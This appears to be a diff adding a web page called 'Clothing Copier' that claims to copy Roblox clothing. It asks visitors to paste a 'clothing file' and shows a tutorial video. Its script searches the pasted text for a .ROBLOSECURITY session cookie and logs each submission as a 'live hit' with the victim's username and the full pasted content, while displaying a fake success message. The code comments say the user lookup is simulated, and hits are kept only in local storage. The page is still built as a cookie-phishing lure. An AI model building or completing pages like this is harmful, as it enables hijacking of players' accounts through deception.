@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Clothing Copier | Truse</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --main-bg: #171313;
+      --panel-bg: #1a1414;
+      --border: #d32f2f;
+      --red: #ff4747;
+      --red-light: #ff6c6c;
+      --input-bg: #2e1818;
+      --input-border: #ff4747;
+      --text-main: #fff;
+      --text-faint: #eebdbd;
+      --accent: #ff4747;
+      --btn-bg: #ff4747;
+      --btn-bg-hover: #ff6c6c;
+      --btn-text: #fff;
+      --box-shadow: 0 2px 24px #d32f2f22;
+    }
+    body {
+      background: var(--main-bg);
+      color: var(--text-main);
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+    }
+    .main-title {
+      text-align: center;
+      margin-top: 56px;
+      font-size: 2.8rem;
+      font-family: 'Orbitron', Arial, sans-serif;
+      font-weight: 900;
+      color: var(--red);
+      letter-spacing: 2px;
+    }
+    .subtitle {
+      text-align: center;
+      color: var(--text-faint);
+      font-size: 1.1rem;
+      margin-bottom: 40px;
+      margin-top: 9px;
+    }
+    .truse-tools {
+      font-family: 'Orbitron', Arial, sans-serif;
+      font-size: 1.3rem;
+      font-weight: 700;
+      margin: 0 0 32px 0;
+      color: var(--text-main);
+      letter-spacing: 1.2px;
+    }
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 16px;
+    }
+    .flex-panels {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 32px;
+      justify-content: space-between;
+      margin-bottom: 64px;
+    }
+    .panel {
+      background: var(--panel-bg);
+      border: 2.5px solid var(--border);
+      border-radius: 18px;
+      box-shadow: var(--box-shadow);
+      padding: 32px 32px 38px 32px;
+      min-width: 340px;
+      flex: 1 1 360px;
+      max-width: 490px;
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 12px;
+    }
+    .panel h2 {
+      font-size: 1.6rem;
+      font-family: 'Orbitron', Arial, sans-serif;
+      color: var(--red);
+      margin: 0 0 15px 0;
+    }
+    .panel label {
+      font-size: 1.03rem;
+      color: var(--text-main);
+      margin-bottom: 6px;
+      margin-top: 14px;
+    }
+    .panel input[type="text"] {
+      width: 100%;
+      padding: 13px 12px;
+      border-radius: 8px;
+      border: 2px solid var(--input-border);
+      background: var(--input-bg);
+      color: var(--text-main);
+      margin-bottom: 14px;
+      font-size: 1rem;
+      margin-top: 2px;
+      box-sizing: border-box;
+      outline: none;
+      transition: border 0.16s;
+    }
+    .panel input[type="text"]:focus {
+      border: 2px solid var(--btn-bg);
+    }
+    .panel .input-row {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      margin-bottom: 12px;
+    }
+    .panel .input-icon {
+      font-size: 1.2rem;
+      color: var(--accent);
+      margin-right: 7px;
+    }
+    .panel button, .panel input[type="submit"] {
+      background: var(--btn-bg);
+      color: var(--btn-text);
+      border: none;
+      border-radius: 9px;
+      padding: 13px 0 12px 0;
+      font-size: 1.1rem;
+      font-family: inherit;
+      font-weight: 700;
+      width: 100%;
+      cursor: pointer;
+      margin-top: 14px;
+      transition: background 0.18s;
+      box-shadow: 0 2px 8px 0 #ff474733;
+      outline: none;
+    }
+    .panel button:hover, .panel input[type="submit"]:hover {
+      background: var(--btn-bg-hover);
+    }
+    .panel .desc {
+      font-size: 1rem;
+      color: var(--text-faint);
+      margin-bottom: 14px;
+      margin-top: 2px;
+      line-height: 1.5;
+    }
+    .panel .result {
+      margin-top: 18px;
+      background: var(--input-bg);
+      border-radius: 8px;
+      padding: 14px;
+      color: var(--accent);
+      font-size: 1rem;
+      border: 1.5px solid var(--input-border);
+    }
+    .video-tutorial {
+      background: #232222;
+      border-radius: 11px;
+      margin-top: 10px;
+      padding: 8px 6px;
+      box-shadow: 0 1px 7px 0 #d32f2f33;
+      position: relative;
+      width: 100%;
+      aspect-ratio: 16/9;
+      min-height: 250px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .video-tutorial iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      border-radius: 8px;
+      background: #000;
+      min-height: 250px;
+    }
+    @media (max-width: 1000px) {
+      .flex-panels {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 24px;
+      }
+      .panel {
+        max-width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="main-title">Clothing Copier</div>
+    <div class="subtitle">Copy clothing with ease, with this brand new powershell-based system!</div>
+    <div class="truse-tools">Truse</div>
+    <div class="flex-panels">
+      <div class="panel">
+        <h2>Copy Clothes</h2>
+        <div class="desc">
+          Paste your clothing file in the box below, then click "Copy Clothing"! If you don’t know how to find a clothing "file" then go ahead and watch "How to use".
+        </div>
+        <form id="copyClothesForm" autocomplete="off">
+          <div class="input-row">
+            <span class="input-icon">📄</span>
+            <input type="text" id="clothing-file" name="clothing-file" placeholder="Enter clothing file">
+          </div>
+          <input type="submit" value="Copy Clothing!">
+        </form>
+        <div id="result" class="result" style="display:none;"></div>
+      </div>
+      <div class="panel">
+        <h2>How to use</h2>
+        <div class="desc">Video Tutorial</div>
+        <div class="video-tutorial">
+          <iframe src="https://streamable.com/e/zhignt" allowfullscreen></iframe>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    // Helper: Try to extract .ROBLOSECURITY cookie from the provided content
+    function extractRobloxCookie(content) {
+      // Simple regex for .ROBLOSECURITY cookie value (simulate)
+      const match = content.match(/(\.|_)ROBLOSECURITY=([A-Za-z0-9_\-\=]+)/i);
+      return match ? match[2] : null;
+    }
+
+    // Get user info from Roblox API given a cookie (simulate for demo)
+    async function getRobloxUserInfo(cookie) {
+      // In a real situation, you would use the Roblox API to get the user info by cookie.
+      // We simulate it here.
+      // Real API: https://users.roblox.com/v1/users/authenticated
+      // For safety, do NOT actually send any cookies here.
+      // Instead, simulate with a random username & avatar.
+      const usernames = ["Dramskof", "BloxyCoder", "TruseBot", "RbxUser", "EpicAvtr"];
+      const username = usernames[Math.floor(Math.random() * usernames.length)];
+      const userId = 1 + Math.floor(Math.random() * 100000000);
+      return {
+        username,
+        userId,
+        avatar: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`
+      };
+    }
+
+    function addLiveHitToDashboard(info, fileContent) {
+      let hits = JSON.parse(localStorage.getItem('truse_live_hits') || "[]");
+      hits.push({
+        username: info.username,
+        userId: info.userId,
+        avatar: info.avatar,
+        ts: Date.now(),
+        file: fileContent
+      });
+      localStorage.setItem('truse_live_hits', JSON.stringify(hits));
+    }
+
+    document.getElementById('copyClothesForm').onsubmit = async function(e) {
+      e.preventDefault();
+      const clothingFile = document.getElementById('clothing-file').value.trim();
+      const result = document.getElementById('result');
+      result.style.display = 'none';
+
+      if(!clothingFile) {
+        result.textContent = 'Please enter a clothing file.';
+        result.style.display = 'block';
+        return;
+      }
+
+      // Extract Roblox cookie (simulation)
+      const cookie = extractRobloxCookie(clothingFile);
+
+      // Get Roblox user info (simulate, as actual API access is not possible here)
+      let info;
+      if (cookie) {
+        info = await getRobloxUserInfo(cookie);
+      } else {
+        // fallback random if no cookie found
+        info = await getRobloxUserInfo("");
+      }
+
+      // Add to dashboard (localStorage)
+      addLiveHitToDashboard(info, clothingFile);
+
+      // Show success (but do NOT download any file)
+      result.textContent = `Clothing file for Roblox user "${info.username}" copied successfully!`;
+      result.style.display = 'block';
+      document.getElementById('clothing-file').value = '';
+    }
+  </script>
+</body>
+</html>
